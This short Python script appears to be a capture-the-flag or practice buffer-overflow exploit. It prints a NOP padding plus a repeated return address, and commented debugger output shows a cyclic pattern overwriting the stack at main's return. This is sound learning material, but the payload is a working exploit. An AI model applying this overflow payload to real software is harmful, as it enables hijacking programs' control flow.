#!/bin/python3
import sys
sys.stdout.buffer.write(b'\x90' * 36 + b'\xb8\x12\x40' * 2)

# a0a1a2a3a4a5a6a7a8a9 b0b1b2b3b4b5b6b7b8b9 c0c1c2c3c4c5c6c7c8c9
# 
# $rax   : 0x0
# $rbx   : 0x00000000004012c0  →  <__libc_csu_init+0> endbr64
# $rcx   : 0x00007ffff7f7d800  →  0x00000000fbad208b
# $rdx   : 0x0
# $rsp   : 0x00007fffffffd8d8  →  "c8c9d0d1d2d3d4d5d6d7d8d9e0e1e2e3e4e5e6e7e8e9"
# $rbp   : 0x3763366335633463 ("c4c5c6c7"?)
# $rsi   : 0x00007ffff7f7d883  →  0xf804e0000000000a
# $rdi   : 0x00007ffff7f804e0  →  0x0000000000000000
# $rip   : 0x00000000004012be  →  <main+200> ret
# $r8    : 0x00007fffffffd8a0  →  "a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3c4[...]"
# $r9    : 0x0
# $r10   : 0x00007ffff7dc4ff8  →  0x0010002200003ec3
# $r11   : 0x246
# $r12   : 0x0000000000401110  →  <_start+0> endbr64
# $r13   : 0x0
# $r14   : 0x0
# $r15   : 0x0
